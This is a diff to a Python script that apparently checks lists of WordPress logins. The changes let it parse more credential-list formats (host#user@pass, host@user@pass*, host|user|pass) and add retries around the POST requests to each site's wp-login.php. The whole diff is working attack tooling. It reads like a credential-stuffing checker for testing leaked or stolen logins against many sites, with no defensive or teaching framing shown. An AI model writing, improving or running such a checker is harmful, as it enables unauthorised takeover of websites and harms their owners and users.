@@ -63,19 +63,38 @@ def print_banner():
 
 def parse_line(line):
     """Parse the line based on the detected format."""
-    if '#' in line and '@' in line:
-        # Format: host#username@password or http(s)://host#username@password
-        if line.startswith('http://') or line.startswith('https://'):
-            # Format: http(s)://host#username@password
+    if line.startswith('http://') or line.startswith('https://'):
+        # Format: http(s)://host#username@password
+        if '#' in line and '@' in line:
             protocol, rest = line.split('://')
             host, credentials = rest.split('#', 1)
             user, passwd = credentials.split('@', 1)
             site = f"{protocol}://{host}/wp-login.php"
-        else:
-            # Format: host#username@password
-            host, credentials = line.split('#', 1)
-            user, passwd = credentials.split('@', 1)
-            site = f"http://{host}/wp-login.php"
+            return site, user, passwd
+        # Format: http(s)://host@username@password
+        elif '@' in line:
+            protocol, rest = line.split('://')
+            host, credentials = rest.split('@', 1)
+            if '@' in credentials:
+                user, passwd = credentials.split('@', 1)
+                site = f"{protocol}://{host}/wp-login.php"
+                return site, user, passwd
+    elif '#' in line and '@' in line:
+        # Format: host#username@password
+        host, credentials = line.split('#', 1)
+        user, passwd = credentials.split('@', 1)
+        site = f"http://{host}/wp-login.php"
+        return site, user, passwd
+    elif '@' in line and '*' in line:
+        # Format: host@user@password*
+        parts = line.split('@')
+        if len(parts) != 3:
+            raise ValueError(f"Invalid line format: {line}")
+        site = parts[0].strip()
+        user = parts[1].strip()
+        passwd = parts[2].rstrip('*').strip()  # Remove the trailing '*' from the password
+        if not site.startswith('http'):
+            site = f"http://{site}/wp-login.php"
         return site, user, passwd
     elif '|' in line:
         # Format: host|user|pass
@@ -122,16 +141,28 @@ def check(line):
         return
 
     try:
-        # Add redirect_to parameter to follow WordPress login flow
+        # Ensure the redirect_to parameter does not contain /wp-login.php twice
+        redirect_to = f"{site}/wp-admin/"
+        if '/wp-login.php' in redirect_to:
+            redirect_to = redirect_to.replace('/wp-login.php', '')
+
         login_data = {
             'log': user,
             'pwd': passwd,
             'wp-submit': 'Log In',
-            'redirect_to': f"{site}/wp-admin/",
+            'redirect_to': redirect_to,
             'testcookie': 1
         }
 
-        response = requests.post(url=site, headers=headers, data=login_data, timeout=10, allow_redirects=True)
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                response = requests.post(url=site, headers=headers, data=login_data, timeout=(5, 10), allow_redirects=True)
+                break  # Exit the loop if the request succeeds
+            except RequestException as e:
+                if attempt == max_retries - 1:
+                    raise  # Re-raise the exception if all retries fail
+                print(Fore.YELLOW + f"Retrying ({attempt + 1}/{max_retries})...")
 
         current_time = datetime.now().strftime("%H:%M:%S")
 
